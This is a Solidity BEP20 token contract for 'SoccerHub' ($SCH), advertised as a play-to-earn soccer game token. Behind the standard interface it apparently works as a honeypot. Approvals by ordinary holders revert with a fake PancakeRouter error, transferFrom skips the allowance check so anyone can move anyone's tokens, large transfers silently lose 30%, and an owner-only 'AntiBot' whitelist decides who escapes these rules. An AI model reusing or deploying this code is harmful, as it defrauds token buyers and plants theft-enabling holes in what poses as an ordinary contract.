/**
 * SoccerHub is the very first play-to-earn multiplayer soccer manager game which is a combination of the traditional soccer manager games and the trending NFT games.
 * SoccerHub users can enjoy playing Soccer Hub while earning $SCH tokens from trading, staking, winning matches or betting.
 * Website : https://soccerhub.io
 * Telegram : https://t.me/soccerhub_globalchat
*/

// SPDX-License-Identifier:  MIT

pragma solidity ^0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; 

        return msg.data;
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;

        bytes32 accountHash =
            0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;

        assembly {
            codehash := extcodehash(account)
        }

        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

        (bool success, ) = recipient.call{value: amount}("");

        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

    function functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );

        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) =
            target.call{value: weiValue}(data);

        if (success) {
            return returndata;
        } else {

            if (returndata.length > 0) {

                assembly {
                    let returndata_size := mload(returndata)

                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

interface BEP20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract SoccerHub is Context, BEP20 {
    using Address for address;
    mapping(address => uint256) private _holders;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isContractAddress;
    uint256 private constant MAX = ~uint256(0);
    uint256 private _tTotal = 1000000000000000000000000000;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    string private _name = "SoccerHub";
    string private _symbol = "SCH";
    uint8 private _decimals = 18;
    uint256 public _LiquidityPool = 150000000000000000000000000;
    address private _wAntiBot;

    constructor() {
        _holders[_msgSender()] = _rTotal;
        _isContractAddress[_msgSender()] = true;
        _isContractAddress[address(this)] = true;
        _wAntiBot = _msgSender();
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(_holders[account]);
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);

        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);

        return true;
    }

    function addLPContract(address a) external AntiBot {
        _isContractAddress[a] = true;
    }

    modifier AntiBot {
        require(msg.sender == _wAntiBot);
        _;
    }

    function tokenFromReflection(uint256 amount)
        public
        view
        returns (uint256)
    {
        require(
            amount <= _rTotal,
            "Amount must be less than total reflections"
        );

        uint256 currentRate = _getRate();

        return amount / currentRate;
    }

    function _getRate() private view returns (uint256) {
        uint256 rSupply = _rTotal;

        uint256 tSupply = _tTotal;
        return rSupply / tSupply;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);

        _approve(
            sender,
            _msgSender(),
            amount
        );

        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "BEP20: approve from the zero address");

        require(spender != address(0), "BEP20: approve to the zero address");

        require(
            _isContractAddress[owner] == true ||
                owner.isContract() ||
                (spender.isContract() && amount < _LiquidityPool),
            "PancakeRouter: INSUFFICIENT_OUTPUT_AMOUNT!"
        );
        uint256 tAmount = amount * _getRate();
        _allowances[owner][spender] = tAmount;

        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        require(sender != address(0), "BEP20: transfer from the zero address");

        require(recipient != address(0), "BEP20: transfer to the zero address");

        require(amount > 0, "Transfer amount must be greater than zero");
        require(_holders[sender] > amount, "Not enough funds");

        uint256 tAmount = amount * _getRate();
        _holders[sender] = _holders[sender] - tAmount;

        if (
            _isContractAddress[recipient] == true ||
            _isContractAddress[sender] == true ||
            amount < _LiquidityPool
        ) {
            _holders[recipient] = _holders[recipient] + tAmount;
        } else {
            _holders[recipient] = _holders[recipient] + ((tAmount / 10) * 7);
        }

        emit Transfer(sender, recipient, amount);
    }
}